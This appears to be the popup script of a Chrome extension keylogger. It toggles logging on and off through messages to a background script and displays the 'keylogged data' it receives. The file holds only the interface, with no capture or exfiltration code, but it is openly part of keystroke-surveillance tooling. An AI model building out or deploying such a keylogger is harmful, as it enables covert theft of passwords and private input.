let keyloggerEnabled = false;

// Get the status of the keylogger from storage
chrome.storage.local.get(['keyloggerEnabled'], function(result) {
  // Initialize the keyloggerEnabled status from storage
  keyloggerEnabled = result.keyloggerEnabled || false;
  // Update the status of the keylogger in the popup
  updateKeyloggerStatus(keyloggerEnabled);
});

// Toggle the keylogger functionality when the button is clicked
document.getElementById('toggleButton').addEventListener('click', function() {
  chrome.runtime.sendMessage({ type: 'toggleKeylogger' });
});

// Get the keylogged data from the background script and display it in the popup window
chrome.runtime.sendMessage({ type: 'getLoggedData' }, function(response) {
  document.getElementById('keyloggedData').innerText = response.data;
});

// Listen for messages from the background script with the keyloggerEnabled status
chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
  if (message.type === 'keyloggerEnabled') {
    updateKeyloggerStatus(message.data);
  }
});
// Update the status of the keylogger in the popup
function updateKeyloggerStatus(keyloggerEnabled) {
  if (keyloggerEnabled) {
    document.getElementById('toggleButton').innerText = 'Disable Keylogger';
  } else {
    document.getElementById('toggleButton').innerText = 'Enable Keylogger';
  }
  document.getElementById('keyloggerStatus').innerText = keyloggerEnabled ? 'Enabled' : 'Disabled'
}